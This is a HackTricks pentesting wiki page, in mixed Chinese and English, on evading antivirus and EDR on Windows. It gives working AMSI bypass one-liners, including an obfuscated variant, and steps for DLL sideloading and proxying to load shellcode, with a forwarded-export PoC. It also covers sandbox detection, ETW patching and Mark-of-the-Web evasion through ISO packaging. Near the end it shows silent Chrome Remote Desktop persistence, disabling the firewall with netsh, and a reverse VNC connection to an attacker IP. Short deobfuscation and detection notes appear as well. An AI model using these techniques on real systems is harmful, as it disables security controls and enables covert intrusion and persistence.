# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**本页作者** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停用 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于阻止 Windows Defender 正常工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来使 Windows Defender 停止工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> 一个用于检查 Windows Defender 静态检测的好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分成多个片段，然后让 Defender 单独扫描每个片段，这样它可以准确地告诉你二进制文件中被标记的字符串或字节是什么。

我强烈推荐你观看这个关于实用 AV Evasion 的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令会列出位于 "C:\Program Files\\" 中易受 DLL hijacking 影响的程序以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**，如果正确实施，这项技术相当隐蔽，但如果你使用公开已知的 DLL Sideloadable 程序，可能很容易被发现。

仅仅放置一个具有程序期望加载名称的恶意 DLL 并不会直接运行你的 payload，因为程序期望该 DLL 中包含一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 会将程序从代理（恶意）DLL 发出的调用转发到原始 DLL，从而保留程序的功能并能够处理你的 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目

这些是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，以及原始（已重命名）的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
以下是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率均为 0/26！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我 **强烈建议** 你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，并且也观看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。

### 滥用转发导出 (ForwardSideLoading)

Windows PE 模块可以导出实际上是“forwarders”的函数：导出项并非指向代码，而是包含形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 会：

- 如果 `TargetDll` 是 KnownDLL，则从受保护的 KnownDLLs 命名空间提供（例如，ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在的目录。

关键行为要点：
- 如果 `TargetDll` 是 KnownDLL，则它来自受保护的 KnownDLLs 命名空间（例如，ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在的目录。

这使得一种间接的 sideloading 原语成为可能：找到一个导出函数并将其转发到非 KnownDLL 模块名的 signed DLL，然后将该 signed DLL 与一个与转发目标模块名完全相同命名、由攻击者控制的 DLL 放在同一目录。当调用转发导出时，loader 解析该转发并从相同目录加载你的 DLL，执行你的 DllMain。

在 Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此它按正常搜索顺序解析。

PoC (copy-paste):
1) 将已签名的系统 DLL 复制到可写的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 `DllMain` 就足以获得 code execution；你不需要实现转发的函数来触发 `DllMain`。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发 forward：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载 side-by-side 的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会遵循转发到 `NCRYPTPROV.SetAuditingInterface`
- 随后加载器会从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，只有在 `DllMain` 已经运行之后才会出现“missing API”错误

Hunting tips:
- 关注那些目标模块不是 KnownDLL 的转发导出。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用以下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

检测/防御 建议:
- 监视 LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- 对如下进程/模块链发出告警： `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` 位于用户可写路径下
- 实施代码完整性策略 (WDAC/AppLocker)，并在应用程序目录中拒绝写入+执行权限

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI 是为防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" 而创建的。最初，AV 只能扫描磁盘上的文件，所以如果你能以某种方式将 payload 直接在内存中执行，AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的这些组件中。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它通过以未加密且未被 unobfuscating 的形式暴露脚本内容，使得防病毒解决方案可以检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上产生如下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是脚本运行的可执行文件路径，在本例中为 powershell.exe

我们并没有将任何文件写到磁盘，但仍然因为 AMSI 在内存中被拦截了。

另外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 运行。这甚至影响 `Assembly.Load(byte[])` 用于内存加载执行。这就是为什么如果你想规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）来进行内存执行的原因。

有几种方法可以绕过 AMSI：

- **Obfuscation**

因为 AMSI 主要依赖静态检测，所以修改你尝试加载的脚本可以是绕过检测的有效方法。

然而，AMSI 有能力对脚本进行 unobfuscating，即使有多层混淆，因此 obfuscation 可能是一个糟糕的选择，具体取决于如何实施。这使得规避并不那么直接。尽管如此，有时你只需要更改几个变量名就能通过，具体取决于该内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程中实现的，即便以非特权用户运行，也可以很容易地对其进行篡改。由于 AMSI 实现中的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败 (amsiInitFailed) 将导致当前进程不发起任何扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 已经开发了签名以防止更广泛的使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码就能使当前 powershell 进程中的 AMSI 失效。这行代码当然已被 AMSI 本身拦截，因此要使用该技术需要做一些修改。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 采纳并修改的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，一旦此帖发布，很可能会被标记，因此如果你的计划是保持不被发现，不要发布任何代码。

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 详情请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**移除被检测的签名**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 之类的工具，从当前进程的内存中移除被检测到的 AMSI 签名。该工具通过扫描当前进程内存中的 AMSI 签名，然后用 NOP 指令覆盖它，从而将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**
如果你使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项功能，允许你记录系统上执行的所有 PowerShell 命令。 这对于审计和故障排查很有用，但对试图规避检测的攻击者来说也是一个问题。

要绕过 PowerShell logging，你可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**: 你可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现此目的。
- **Use Powershell version 2**: 如果使用 PowerShell version 2，AMSI 将不会被加载，因此你可以运行脚本而不被 AMSI 扫描。你可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防护的 PowerShell 会话（这正是来自 Cobal Strike 的 `powerpick` 所使用的）。


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

在分析使用 ConfuserEx 2（或商业分支）的 malware 时，通常会遇到多层保护，这些保护会阻止反编译器和 sandboxes。下面的工作流程能可靠地 **restores a near–original IL**，之后能在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  Anti-tampering removal – ConfuserEx 会加密每个 *method body* 并在 *module* 静态构造函数 (`<Module>.cctor`) 中对其解密。这同时会修补 PE checksum，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位被加密的元数据表，恢复 XOR keys 并重写一个干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper 参数（`key0-key3`, `nameHash`, `internKey`），在构建你自己的 unpacker 时会有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件输入 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – 选择 ConfuserEx 2 配置文件
• de4dot 将撤销 control-flow flattening，恢复原始的 namespaces、classes 和 variable names，并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 用轻量包装器（即 *proxy calls*）替换直接的方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
在此步骤之后，你应该能看到正常的 .NET API（例如 `Convert.FromBase64String` 或 `AES.Create()`），而不是不透明的包装函数（`Class8.smethod_10` 等）。

4.  Manual clean-up – 在 dnSpy 中运行生成的二进制，搜索大型的 Base64 blob 或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用以定位 *real* payload。通常 malware 会将其存为在 `<Module>.byte_0` 中初始化的 TLV 编码字节数组。

上述链在 **without** 需要运行恶意样本的情况下恢复执行流程——这在离线工作站上工作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动分类样本。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和 tamper-proofing 提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 在编译时生成 obfuscated code，且无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ template metaprogramming 框架生成的 obfuscated operations，使试图破解应用的人更难以得手。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对各种不同的 pe files（包括：.exe、.dll、.sys）进行 obfuscate。
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个针对任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个细粒度的 code obfuscation 框架，适用于 LLVM-supported languages，使用 ROP (return-oriented programming)。ROPfuscator 在汇编级别通过将常规指令转换为 ROP chains 来 obfuscate 程序，从而破坏我们对正常控制流的固有认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能将现有的 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen & MoTW

你可能在从互联网下载一些可执行文件并运行它们时见过这个提示界面。

Microsoft Defender SmartScreen 是一种旨在保护最终用户免于运行潜在恶意应用程序的安全机制。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于声誉的方法，这意味着不常见的下载应用会触发 SmartScreen，从而警告并阻止最终用户执行该文件（尽管可以通过点击 More Info -> Run anyway 仍然执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时会自动创建，同时记录下载该文件的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用 **trusted** signing certificate 签名的可执行文件 **won't trigger SmartScreen**。

防止你的 payloads 被打上 Mark of The Web 的一个非常有效的方法是将它们打包到某种容器中，例如 ISO。之所以有效，是因为 Mark-of-the-Web (MOTW) **cannot** 应用于 **non NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包进输出容器以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志记录机制，允许应用程序和系统组件**记录事件**。但它也可以被安全产品用来监控和检测恶意活动。

类似于 AMSI 被禁用（绕过）的方法，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这是通过在内存中修补该函数使其立即返回来实现的，从而有效地禁用了该进程的 ETW 日志。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

Loading C# binaries in memory 已为人所知已有一段时间，仍然是运行你的 post-exploitation 工具而不被 AV 发现的一个很好的方式。

由于 payload 会直接加载到内存而不接触磁盘，我们只需要担心为整个进程修补 AMSI。

大多数 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的实现方式：

- **Fork\&Run**

它涉及**生成一个新的牺牲进程（spawning a new sacrificial process）**，将你的 post-exploitation 恶意代码注入到该新进程中，执行恶意代码，完成后终止该进程。此方法有利有弊。Fork and run 的好处是执行发生在我们的 Beacon implant 进程**之外**。这意味着如果我们的 post-exploitation 操作出现问题或被发现，我们的**implant 更有可能存活**。缺点是更有可能被 **Behavioural Detections** 发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这是将 post-exploitation 恶意代码注入**到其自身进程中（into its own process）**。通过这种方式，你可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 的执行出现问题，你就更有可能**丢失你的 beacon（losing your beacon）**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想了解更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell** 加载 C# Assemblies，参考 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)，可以通过让受害机器访问位于 Attacker Controlled SMB share 上的解释器环境，使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的 Interpreter Binaries 和环境，你可以在被攻陷机器的内存中**执行这些语言的任意代码**。

该仓库指出：Defender 仍然会扫描这些脚本，但通过使用 Go、Java、PHP 等语言，我们在**绕过静态签名**方面有更多灵活性。对这些语言中随机未混淆的 reverse shell 脚本的测试已证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操纵访问令牌或像 EDR 或 AV 这样的安全产品**，使其降低权限，从而进程不会终止但也没有权限检查恶意活动。

为防止这种情况，Windows 可能会**阻止外部进程**获取安全进程的令牌句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，很容易在受害者 PC 上部署 Chrome Remote Desktop，然后用它接管并维持持久化：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件下载该 MSI。
2. 在受害者机器上以静默方式运行安装程序（需要管理员）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导会要求你授权；点击 Authorize 按钮继续。
4. 用一些调整后的参数执行给出的命令：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数，它允许在不使用 GUI 的情况下设置 pin）。

## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你需要在单个系统中考虑来自许多不同来源的遥测，所以在成熟的环境中完全不被发现几乎是不可能的。

你遇到的每个环境都会有其自身的强项和弱点。

我强烈建议你去观看来自 [@ATTL4S](https://twitter.com/DaniLJ94) 的这个演讲，以便对更高级的 Evasion 技术有一个初步了解。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一场关于 Evasion in Depth 的精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**，直到**找出 Defender 认为恶意的部分**并把它拆分给你。\
另一个做同样事情的工具是 [**avred**](https://github.com/dobin/avred)，并且有一个开放的 web 服务在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

在 Windows10 之前，所有 Windows 都带有一个可以安装的 **Telnet server**（以管理员身份）操作如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (请下载 bin 版本，不要安装程序)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

Then, move the binary _**winvnc.exe**_ and **新创建的** 文件 _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为保持隐蔽性，你必须避免以下行为

